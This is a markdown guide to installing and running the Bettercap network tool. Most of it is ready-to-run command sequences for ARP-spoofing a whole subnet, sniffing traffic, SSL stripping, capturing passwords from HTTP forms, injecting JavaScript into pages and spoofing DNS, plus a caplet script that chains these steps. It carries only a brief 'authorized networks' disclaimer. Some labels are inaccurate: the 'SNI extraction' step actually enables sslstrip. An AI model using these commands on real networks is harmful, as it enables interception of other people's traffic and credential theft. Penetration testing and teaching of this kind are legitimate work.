# 🛠️ Bettercap Full Setup & Usage Guide

This guide explains the **installation, configuration, and usage** of Bettercap from scratch, including detailed descriptions of commands, flags, and modules.

---

## 📦 Installation From Source (Ubuntu/Debian)

### Step 1: Install System Dependencies

```bash
sudo apt update
sudo apt install -y build-essential \
                    libpcap-dev \
                    libusb-1.0-0-dev \
                    pkg-config \
                    git \
                    ruby-dev \
                    libnetfilter-queue-dev \
                    golang
```

### Step 2: Clone Bettercap Repository

```bash
cd ~
git clone https://github.com/bettercap/bettercap.git
```

### Step 3: Build and Install

```bash
cd bettercap
make build
sudo make install
```

---

## 🚀 Starting Bettercap

### Basic Startup (Replace `wlo1` with your interface)

```bash
sudo bettercap -iface wlo1
```

### Common Flags

* `-iface <interface>`: Specify the network interface to use.
* `-eval <commands>`: Run commands at launch (e.g. `-eval "net.probe on"`).

---

## 🔧 Core Bettercap Modules

### 1. Network Discovery

```bash
net.probe on
net.recon on
net.show
```

**Purpose:**

* Scans the LAN for live devices and shows them.

---

### 2. ARP Spoofing

```bash
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
arp.spoof on
```

**Purpose:**

* Perform MITM on the whole subnet.
* `internal true`: Spoof gateway <-> client both ways.

---

### 3. DNS Sniffing

```bash
net.sniff on
```

**Captures DNS, HTTP, HTTPS, and other sniffable protocols.**

---

### 4. Packet Sniffing + Logging

```bash
net.sniff.verbose true
set net.sniff.output /home/user/sniff.log
net.sniff on
```

**Logs all sniffed traffic to a file.**

---

### 5. HTTPS SNI Extraction

```bash
https.proxy.sslstrip true
https.proxy on
```

**Extracts domain names from HTTPS (via SNI).**

---

## 📚 Helpful Commands

### Show All Modules

```bash
help
```

### Get Info About a Module

```bash
help <module>
```

Example:

```bash
help arp.spoof
```

### Stop a Module

```bash
<module> off
```

Example:

```bash
arp.spoof off
```

### Save All Output to File

```bash
set events.stream.output events.txt
events.stream on
```

---

## 🧪 Useful Extras

### Save Bettercap Session Commands (Batch Mode)

```bash
echo "set arp.spoof.internal true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on" > my_script.cap
```

Then run:

```bash
sudo bettercap -iface wlo1 -caplet my_script.cap
```

---

## 🔚 To Stop All Attacks

```bash
arp.spoof off
net.sniff off
```

Or press `Ctrl+C`.

---

## 🧠 Notes

* Run Bettercap **as root**.
* Use responsibly and only on **authorized** networks.
* Best to disable firewalls and make sure IP forwarding is enabled:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

✅ You're now ready to use Bettercap for ethical testing!





# sample of using

##  Enable ARP Spoofing + DNS/HTTP/HTTPS Sniffing
- optional -----> set arp.spoof.targets 192.168.1.0/24
- set arp.spoof.internal true
- arp.spoof on
- net.sniff on



## Capture Passwords from HTTP Forms

- http.server on
- http.proxy on
- set http.proxy.script js/passwords.js



##  Log All DNS, HTTP, and HTTPS (SNI)
- set net.sniff.verbose true
- set net.sniff.local true
- net.sniff on
## Strip HTTPS (Best effort)
- set https.proxy.sslstrip true
- https.proxy on
## optional  (Inject JavaScript into HTTP Pages)
- set http.proxy.script js/injectjs.js
- http.proxy on

## Redirect or Block a Website

- set dns.spoof.domains facebook.com
- set dns.spoof.address 142.250.190.14  # google.com IP

# Block a site (no resolve)
- set dns.spoof.domains facebook.com
- set dns.spoof.address 0.0.0.0
- dns.spoof on

## Real-Time GUI

- caplets.update
- ui.update
- ui.enable



# Reset all

- net.recon off
- arp.spoof off
- dns.spoof off
- net.sniff off
- https.proxy off
- http.proxy off
